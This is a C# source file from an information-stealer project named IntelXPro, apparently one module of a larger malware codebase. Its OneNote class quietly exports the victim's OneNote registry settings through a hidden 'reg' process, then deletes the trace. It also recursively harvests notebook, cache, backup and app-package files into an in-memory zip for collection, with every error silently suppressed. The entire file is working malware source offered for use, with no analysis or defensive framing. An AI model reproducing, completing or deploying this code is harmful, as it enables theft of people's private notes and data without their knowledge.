using IntelXPro.src.IntelXPro.Dependencies.Data;
using IntelXPro.src.IntelXPro.Stealer;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;

namespace IntelXPro.src.IntelXPro.Stealer.Applications.Microsoft
{
    internal class OneNote : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            try
            {
                var oneNoteApp = new Counter.CounterApplications { Name = "Microsoft OneNote" };
                
                CollectOneNoteRegistry(zip, oneNoteApp);
                CollectOneNoteFiles(zip, oneNoteApp);
                CollectOneNoteUWP(zip, oneNoteApp);
                
                if (oneNoteApp.Files.Count > 0)
                {
                    counter.Applications.Add(oneNoteApp);
                }
            }
            catch { }
        }

        private void CollectOneNoteRegistry(InMemoryZip zip, Counter.CounterApplications oneNoteApp)
        {
            try
            {
                string regPath = @"HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\OneNote";
                string fileName = "onenote_registry.reg";
                
                using (var process = new Process())
                {
                    process.StartInfo.FileName = "reg";
                    process.StartInfo.Arguments = $"export \"{regPath}\" \"{fileName}\" /y";
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.CreateNoWindow = true;
                    process.Start();
                    process.WaitForExit();

                    if (File.Exists(fileName))
                    {
                        string relativePath = Path.Combine("Microsoft", "OneNote", fileName);
                        zip.AddFile(relativePath, File.ReadAllBytes(fileName));
                        oneNoteApp.Files.Add(relativePath);
                        File.Delete(fileName);
                    }
                }
            }
            catch { }
        }

        private void CollectOneNoteFiles(InMemoryZip zip, Counter.CounterApplications oneNoteApp)
        {
            try
            {
                string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                
                string[] oneNotePaths = {
                    Path.Combine(localAppData, "Microsoft", "OneNote", "16.0", "cache"),
                    Path.Combine(localAppData, "Microsoft", "OneNote", "16.0", "Backup"),
                    Path.Combine(appData, "Microsoft", "OneNote")
                };

                foreach (string oneNotePath in oneNotePaths)
                {
                    if (Directory.Exists(oneNotePath))
                    {
                        CollectOneNoteFilesFromPath(oneNotePath, zip, oneNoteApp);
                    }
                }
            }
            catch { }
        }

        private void CollectOneNoteUWP(InMemoryZip zip, Counter.CounterApplications oneNoteApp)
        {
            try
            {
                string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string uwpPath = Path.Combine(localAppData, "Packages", "Microsoft.Office.OneNote_8wekyb3d8bbwe", "LocalState");
                
                if (Directory.Exists(uwpPath))
                {
                    CollectOneNoteFilesFromPath(uwpPath, zip, oneNoteApp);
                }
            }
            catch { }
        }

        private void CollectOneNoteFilesFromPath(string basePath, InMemoryZip zip, Counter.CounterApplications oneNoteApp)
        {
            try
            {
                foreach (string file in Directory.GetFiles(basePath, "*", SearchOption.AllDirectories))
                {
                    try
                    {
                        string extension = Path.GetExtension(file).ToLower();
                        string fileName = Path.GetFileName(file).ToLower();
                        
                        if (extension == ".one" || extension == ".onepkg" || extension == ".onetoc2" || 
                            extension == ".db" || extension == ".cache" || extension == ".json" ||
                            fileName.Contains("onenote") || fileName.Contains("notebook"))
                        {
                            string relativePath = Path.Combine("Microsoft", "OneNote", 
                                file.Substring(basePath.Length).TrimStart('\\'));
                            
                            zip.AddFile(relativePath, File.ReadAllBytes(file));
                            oneNoteApp.Files.Add(relativePath);
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }
    }
}
